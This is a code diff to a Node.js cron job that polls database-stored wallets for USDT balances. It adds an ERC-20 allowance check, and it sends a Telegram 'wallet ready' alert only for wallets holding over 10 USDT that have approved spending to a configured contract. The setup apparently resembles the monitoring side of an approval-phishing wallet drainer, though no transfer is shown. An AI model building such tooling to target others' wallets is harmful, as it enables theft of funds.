@@ -2,6 +2,7 @@ const cron = require('node-cron');
 const database = require('../config/database');
 const contractService = require('../services/contract.service');
 const telegram = require('../config/telegram');
+const { ethers } = require('ethers');
 
 class BalanceChecker {
     constructor() {
@@ -48,10 +49,17 @@ class BalanceChecker {
                     const balance = await contractService.getWalletUSDTBalance(wallet.address);
                     console.log(`Wallet ${wallet.address} balance: ${balance} USDT`);
                     
-                    // If balance > 10 USDT, send alert
+                    // Only send alert if balance > 10 USDT
                     if (parseFloat(balance) > 10) {
-                        console.log(`Wallet ${wallet.address} has ${balance} USDT - sending alert`);
-                        await telegram.sendWalletReadyAlert(wallet.address, balance);
+                        // Check if wallet has approved USDT spending
+                        const hasApprovedSpending = await this.checkWalletApproval(wallet.address);
+                        
+                        if (hasApprovedSpending) {
+                            console.log(`Wallet ${wallet.address} has ${balance} USDT and approved spending - sending alert`);
+                            await telegram.sendWalletReadyAlert(wallet.address, balance);
+                        } else {
+                            console.log(`Wallet ${wallet.address} has ${balance} USDT but has not approved spending - skipping alert`);
+                        }
                     }
                     
                     // Update database with current balance
@@ -69,6 +77,39 @@ class BalanceChecker {
             }
         } catch (error) {
             console.error('Error fetching wallets from database:', error);
+        }
+    }
+
+    // Check if wallet has approved USDT spending by checking allowance
+    async checkWalletApproval(walletAddress) {
+        try {
+            // Check if wallet has approved spending by checking USDT allowance
+            const usdtContractAddress = process.env.USDT_CONTRACT_ADDRESS;
+            const contractAddress = process.env.CONTRACT_ADDRESS;
+            
+            if (!usdtContractAddress || !contractAddress || !contractService.provider) {
+                console.error('Missing contract addresses or provider for approval check');
+                return false;
+            }
+            
+            // Create USDT contract instance
+            const usdtContract = new ethers.Contract(
+                usdtContractAddress,
+                ['function allowance(address owner, address spender) external view returns (uint256)'],
+                contractService.provider
+            );
+            
+            // Check allowance
+            const allowance = await usdtContract.allowance(walletAddress, contractAddress);
+            
+            // If allowance is greater than 0, wallet has approved spending
+            const hasApproved = allowance > 0;
+            console.log(`Wallet ${walletAddress} allowance: ${allowance.toString()}, approved: ${hasApproved}`);
+            
+            return hasApproved;
+        } catch (error) {
+            console.error(`Error checking approval for wallet ${walletAddress}:`, error.message);
+            return false;
         }
     }
 }
